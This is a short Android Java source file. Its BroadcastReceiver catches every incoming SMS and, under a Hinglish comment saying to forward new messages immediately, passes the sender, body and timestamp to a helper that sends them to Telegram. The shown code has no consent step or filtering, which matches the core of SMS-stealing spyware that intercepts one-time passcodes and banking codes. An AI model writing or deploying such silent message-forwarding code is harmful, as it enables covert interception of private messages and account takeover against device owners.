package com.smshandler;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    if (sms != null) {
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getMessageBody();
                        long timestamp = sms.getTimestampMillis();

                        // Naye SMS ko turant forward karo
                        SmsService.sendToTelegram(context, sender, message, timestamp);
                    }
                }
            }
        }
    }
}